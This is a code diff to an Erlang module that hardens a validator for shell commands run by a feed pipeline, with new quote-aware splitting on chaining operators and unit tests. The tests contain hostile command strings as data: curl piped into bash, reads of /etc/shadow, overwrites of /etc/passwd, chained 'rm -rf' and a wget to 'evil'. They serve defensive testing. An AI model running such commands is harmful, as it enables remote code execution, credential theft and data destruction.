@@ -603,17 +603,22 @@ json_escape_char(C) -> C.
 
 %% @doc Validates a `shell:' source command before it is passed to `os:cmd/1'.
 %%
-%% Security hardening (task 11). The command is split into pipeline segments on
-%% unquoted `|' (quote-aware: a `|' or `\|' inside single/double quotes is not a
-%% separator), and each segment's executable (first token) must be EITHER an
-%% absolute path (starts with `/') OR the bare basename of a safe text-processing
-%% utility on the allowlist. The basename of every executable (absolute or bare)
-%% is additionally checked against a blocklist of destructive commands and
-%% general-purpose shells, so the allowlist can never re-admit a blocked command.
-%% Command substitution (backticks, `$(') and output redirection (unquoted `>'
-%% / `>>') are rejected. Pipes, quotes, parentheses inside awk/sed expressions,
-%% `&' inside quoted URLs, etc. are allowed since they are essential for real
-%% feed pipelines.
+%% Security hardening (task 11). The command is split into segments on any
+%% unquoted command separator — the pipe `|' AND the command-chaining operators
+%% `;', `&' (covers `&&' / background `&') and newline / carriage-return
+%% (quote-aware: a separator inside single/double quotes is literal, not a
+%% separator). EVERY resulting segment's executable (first token) is validated,
+%% so a destructive command chained after a benign one (e.g.
+%% `curl ... ; rm -rf /') is caught as a segment leader rather than slipping
+%% through mid-string. Each executable must be EITHER an absolute path (starts
+%% with `/') OR the bare basename of a safe text-processing utility on the
+%% allowlist. The basename of every executable (absolute or bare) is additionally
+%% checked against a blocklist of destructive commands and general-purpose
+%% shells, so the allowlist can never re-admit a blocked command. Command
+%% substitution (backticks, `$('), output redirection (unquoted `>' / `>>') and
+%% input redirection (unquoted `<') are rejected. Quotes, parentheses inside
+%% awk/sed expressions, `&' inside quoted URLs, etc. are allowed since they are
+%% essential for real feed pipelines.
 %%
 %% @param CMD The shell command binary (the part after the `shell:' prefix).
 %% @returns `{ok, CMD}' if the command is allowed, or `{error, Reason}' otherwise.
@@ -639,8 +644,9 @@ shell_safe_utils() ->
   ["sort","uniq","grep","egrep","fgrep","sed","awk","gawk","cut","tr",
    "head","tail","cat","comm","wc","tee"].
 
-%% @doc Quote-aware scanner. Splits the command into pipeline segments on
-%% unquoted `|' and rejects command substitution / output redirection.
+%% @doc Quote-aware scanner. Splits the command into segments on any unquoted
+%% command separator (`|', `;', `&', newline, carriage-return) and rejects
+%% command substitution / output / input redirection.
 %% State is `none' (unquoted), `single' (inside '...') or `double' (inside "...").
 scan_shell_cmd([], none, CurSeg, Segs) ->
   {ok, lists:reverse([lists:reverse(CurSeg) | Segs])};
@@ -677,7 +683,15 @@ scan_shell_cmd([$$, $( | _Rest], none, _CurSeg, _Segs) ->
   {error, command_substitution};
 scan_shell_cmd([$> | _Rest], none, _CurSeg, _Segs) ->
   {error, output_redirection};
-scan_shell_cmd([$| | Rest], none, CurSeg, Segs) ->
+scan_shell_cmd([$< | _Rest], none, _CurSeg, _Segs) ->
+  {error, input_redirection};
+%% Command separators — the pipe plus the chaining operators. Each ends the
+%% current segment and starts a new one, so EVERY chained command's executable
+%% is validated (a blocked command after `;'/`&'/newline is caught as a segment
+%% leader). `&&' yields an empty middle segment, which validate_shell_segments_1
+%% rejects as `empty_segment'.
+scan_shell_cmd([Sep | Rest], none, CurSeg, Segs)
+    when Sep == $|; Sep == $;; Sep == $&; Sep == $\n; Sep == $\r ->
   scan_shell_cmd(Rest, none, [], [lists:reverse(CurSeg) | Segs]);
 scan_shell_cmd([C | Rest], none, CurSeg, Segs) ->
   scan_shell_cmd(Rest, none, [C | CurSeg], Segs).
@@ -1021,10 +1035,25 @@ validate_shell_cmd_test() -> [
 	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/bin/rm -rf /tmp/data">>)),
 	?assertMatch({error, {blocked_command, "bash"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/bash">>)),
 	?assertMatch({error, {blocked_command, "sh"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/sh -c 'cat /etc/shadow'">>)),
-	%% --- rejected: command substitution and output redirection ---
+	%% --- rejected: command substitution and output/input redirection ---
 	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl http://example.com/$(cat /etc/shadow)">>)),
 	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl `cat /etc/shadow`">>)),
-	?assertMatch({error, output_redirection}, validate_shell_cmd(<<"/usr/bin/curl http://example.com > /etc/passwd">>))
+	?assertMatch({error, output_redirection}, validate_shell_cmd(<<"/usr/bin/curl http://example.com > /etc/passwd">>)),
+	?assertMatch({error, input_redirection}, validate_shell_cmd(<<"/usr/bin/curl http://example.com < /etc/passwd">>)),
+	%% --- rejected: command chaining via ;, &&, & and newline (each command is
+	%% now a validated segment, so the blocked command is caught as a leader) ---
+	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com ; rm -rf /tmp/data">>)),
+	%% `&&' produces an empty middle segment, which is rejected first (still a
+	%% rejection — the chained `rm' never executes).
+	?assertMatch({error, empty_segment}, validate_shell_cmd(<<"/usr/bin/curl http://example.com && /bin/rm -rf /tmp/data">>)),
+	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com\n/bin/rm -rf /tmp/data">>)),
+	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com & rm -rf /tmp/data">>)),
+	%% a non-blocklisted but relative command chained after `;' is still rejected
+	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com ; wget http://evil">>)),
+	%% chaining two allowed absolute commands with `;' is accepted (each validated)
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s http://a.example ; /usr/bin/curl -s http://b.example">>)),
+	%% separators inside quotes are literal, not separators
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s 'https://example.com/feed?a=1&b=2;c=3'">>))
 ].
 
 %% Verifies the source-attribution mask abstraction (IOC Source Attribution,
